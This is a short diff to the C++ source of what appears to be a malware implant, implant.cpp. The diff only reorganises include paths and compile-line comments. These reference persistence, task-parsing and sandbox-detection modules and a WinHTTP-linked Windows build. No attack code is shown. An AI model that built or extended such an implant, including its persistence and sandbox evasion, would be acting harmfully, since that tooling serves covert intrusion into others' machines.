@@ -10,11 +10,11 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <future>
 #include <cmath>
 
-#include "persist.h"
-#include "parse.h"
+#include "persist/persist.h"
+#include "parse/parse.h"
 #include "Feiyu/sandbox_detection.h"
 
-// current compile line is - g++ implant.cpp persist.cpp parse.cpp -lwinhttp -lbcrypt -static -o implant.exe
+// current compile line is - g++ implant.cpp persist/persist.cpp parse/parse.cpp -lwinhttp -lbcrypt -static -o implant.exe 
 
 // I think this is putting in the sandbox_detection
 // g++ implant.cpp persist.cpp parse.cpp Feiyu/sandbox_detection.cpp -lwinhttp -lbcrypt -static -o implant.exe
